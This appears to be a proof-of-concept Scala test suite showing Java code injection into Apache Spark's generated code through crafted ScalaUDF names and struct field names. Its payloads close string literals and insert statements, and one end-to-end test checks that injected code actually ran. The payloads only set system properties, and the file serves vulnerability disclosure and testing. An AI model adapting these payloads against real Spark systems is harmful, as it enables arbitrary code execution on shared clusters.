/*
 * Proof of Concept test: Catalyst Code Injection via ScalaUDF
 *
 * Run with:
 *   build/sbt 'sql/testOnly *ScalaUDFCodeInjectionTest'
 *
 * Copy this file to:
 *   sql/core/src/test/scala/org/apache/spark/sql/execution/ScalaUDFCodeInjectionTest.scala
 */
package org.apache.spark.sql.execution

import org.apache.spark.sql.{Column, QueryTest, Row}
import org.apache.spark.sql.catalyst.expressions.{AttributeReference, Literal, ScalaUDF}
import org.apache.spark.sql.catalyst.expressions.codegen.CodegenContext
import org.apache.spark.sql.execution.debug.codegenString
import org.apache.spark.sql.functions._
import org.apache.spark.sql.test.SharedSparkSession
import org.apache.spark.sql.types._

class ScalaUDFCodeInjectionTest extends QueryTest with SharedSparkSession {

  private def getGeneratedCode(scalaUdf: ScalaUDF): String = {
    val ctx = new CodegenContext()
    scalaUdf.genCode(ctx)
    // Get the full code by examining the context's generated functions
    ctx.declareAddedFunctions() + "\n" +
      scalaUdf.genCode(new CodegenContext()).code.toString
  }

  test("PoC 1 - UDF name injection into generated code") {
    // Attack: the UDF name contains a double-quote that breaks out of the Java string literal
    // in the generated code at ScalaUDF.scala:1173:
    //   "$functionName", "$inputTypesString", "$outputType", e);
    val maliciousName = """", "", "", null); System.setProperty("INJECTED","true"); String x=("""

    val udfExpr = ScalaUDF(
      function = (x: Any) => x,
      dataType = IntegerType,
      children = Seq(Literal(42)),
      udfName = Some(maliciousName)
    )

    val ctx = new CodegenContext()
    val code = udfExpr.genCode(ctx).code.toString

    // Verify the injection payload appears verbatim in generated Java code
    assert(code.contains("""System.setProperty("INJECTED","true")"""),
      s"Injected code should appear in generated source.\nGenerated code:\n$code")

    // Verify the payload is OUTSIDE a string literal context (i.e., it's actual Java code)
    // The pattern should show: ...null); System.setProperty(...
    // NOT: ..."...System.setProperty..."...
    assert(code.contains("""null); System.setProperty("INJECTED","true"); String x="""),
      s"Payload should be executable Java, not inside a string literal.\nGenerated code:\n$code")

    println("=== PoC 1: UDF Name Injection ===")
    println("Generated code (relevant lines):")
    code.linesIterator.foreach { line =>
      if (line.contains("INJECTED") || line.contains("failedExecute")) {
        println(s"  $line")
      }
    }
    println()
  }

  test("PoC 2 - Input struct field name injection into generated code") {
    // Attack: a struct field name containing a double-quote breaks out of
    // "$inputTypesString" in the generated code.
    // inputTypesString = children.map(_.dataType.catalogString).mkString(", ")
    // StructType.catalogString embeds field names directly.
    val maliciousField = """x","","",null);System.setProperty("INJECTED2","true");String q=("""

    val structType = StructType(Seq(StructField(maliciousField, IntegerType)))
    val structExpr = Literal.default(structType)

    val udfExpr = ScalaUDF(
      function = (x: Any) => 1,
      dataType = IntegerType,
      children = Seq(structExpr),
      udfName = Some("safe_name")
    )

    val ctx = new CodegenContext()
    val code = udfExpr.genCode(ctx).code.toString

    assert(code.contains("""System.setProperty("INJECTED2","true")"""),
      s"Struct field name injection should appear in generated code.\nGenerated:\n$code")

    println("=== PoC 2: Input Type Field Name Injection ===")
    println("Generated code (relevant lines):")
    code.linesIterator.foreach { line =>
      if (line.contains("INJECTED2") || line.contains("failedExecute")) {
        println(s"  $line")
      }
    }
    println()
  }

  test("PoC 3 - Output struct field name injection into generated code") {
    // Attack: the UDF's return type is a StructType with a malicious field name.
    // outputType = dataType.catalogString embeds field names.
    val maliciousField = """z",null);System.setProperty("INJECTED3","true");String r=("""

    val outputType = StructType(Seq(StructField(maliciousField, IntegerType)))

    val udfExpr = ScalaUDF(
      function = (x: Any) => null,
      dataType = outputType,
      children = Seq(Literal(1)),
      udfName = Some("safe_name")
    )

    val ctx = new CodegenContext()
    val code = udfExpr.genCode(ctx).code.toString

    assert(code.contains("""System.setProperty("INJECTED3","true")"""),
      s"Output type field name injection should appear in generated code.\nGenerated:\n$code")

    println("=== PoC 3: Output Type Field Name Injection ===")
    println("Generated code (relevant lines):")
    code.linesIterator.foreach { line =>
      if (line.contains("INJECTED3") || line.contains("failedExecute")) {
        println(s"  $line")
      }
    }
    println()
  }

  test("PoC 4 - End-to-end: injected code executes via whole-stage codegen") {
    // This is the full end-to-end proof: we create a UDF with a malicious name,
    // execute a query that triggers codegen, and verify the injected Java code ran.
    System.clearProperty("SPARK_CODEGEN_INJECTION_POC")

    // Craft a payload that:
    //   1. Closes the first string arg with "
    //   2. Provides remaining args to complete the method call
    //   3. Adds our malicious statement
    //   4. Opens a new try/catch + throw to keep Java syntax valid
    //
    // Original generated code (ScalaUDF.scala:1166-1174):
    //   $boxedType $resultTerm = null;
    //   try {
    //     $funcInvocation;
    //   } catch (Throwable e) {
    //     throw QueryExecutionErrors.failedExecuteUserDefinedFunctionError(
    //       "$functionName", "$inputTypesString", "$outputType", e);
    //   }
    //
    // With functionName = <payload> (funcCls), it becomes:
    //   ... "$functionName", "$inputTypesString", "$outputType", e);
    //   ... "PAYLOAD (funcCls)", "bigint", "bigint", e);
    //
    // We need to produce valid Java. The payload closes the method call, injects
    // our code, and opens a dummy expression to consume the trailing args.

    val funcCls = classOf[Function1[_, _]].getSimpleName  // roughly "Function1"
    // The full functionName will be: <payload> (<funcCls>)
    // So the generated code will be:
    //   "...<payload> (<funcCls>)", "bigint", "bigint", e);

    val payload = Seq(
      // Close the first string: "x"
      """x",""",
      // Provide 2nd and 3rd string args + throwable to complete the original method call:
      """ "y", "z", e);""",
      // Now inject our code - runs unconditionally when the class is loaded:
      """} System.setProperty("SPARK_CODEGEN_INJECTION_POC","pwned"); if(false){""",
      // Re-open a throw statement to consume the remaining generated code
      """throw org.apache.spark.sql.errors.QueryExecutionErrors.failedExecuteUserDefinedFunctionError("""",
      // The generated code will append: (funcCls)", "bigint", "bigint", e);
      // So we need our string to end just before that
    ).mkString

    val identityFn: Long => Long = x => x

    val udfExpr = ScalaUDF(
      function = identityFn,
      dataType = LongType,
      children = Seq(AttributeReference("id", LongType)()),
      inputEncoders = Nil,
      outputEncoder = None,
      udfName = Some(payload),
      nullable = true,
      udfDeterministic = true
    )

    // Wrap in a Column and execute a real query
    val df = spark.range(1).select(new Column(udfExpr))

    println("=== PoC 4: End-to-End Execution ===")
    println("Executing query with injected UDF...")

    try {
      // This triggers WholeStageCodegen -> compiles the generated Java -> runs it
      val results = df.collect()
      println(s"Query returned: ${results.map(_.toString).mkString(", ")}")
    } catch {
      case e: Exception =>
        // Even if the query fails, the injected code may have run during compilation
        println(s"Query exception: ${e.getClass.getSimpleName}: ${e.getMessage}")
    }

    val injectedValue = System.getProperty("SPARK_CODEGEN_INJECTION_POC")
    println(s"System.getProperty(\"SPARK_CODEGEN_INJECTION_POC\") = $injectedValue")

    if (injectedValue == "pwned") {
      println("*** CODE INJECTION CONFIRMED: arbitrary Java code executed in Spark JVM ***")
    } else {
      // If codegen was skipped (e.g., fallback to interpreted), show the generated code
      println("Codegen may have been skipped or payload didn't compile.")
      println("Verifying payload is present in generated code...")
      val ctx = new CodegenContext()
      val code = udfExpr.genCode(ctx).code.toString
      assert(code.contains("SPARK_CODEGEN_INJECTION_POC"),
        "Payload should at least be present in generated code")
      println("Payload IS present in generated Java source code.")
      println("Generated code:")
      code.linesIterator.foreach(l => println(s"  $l"))
    }
  }
}
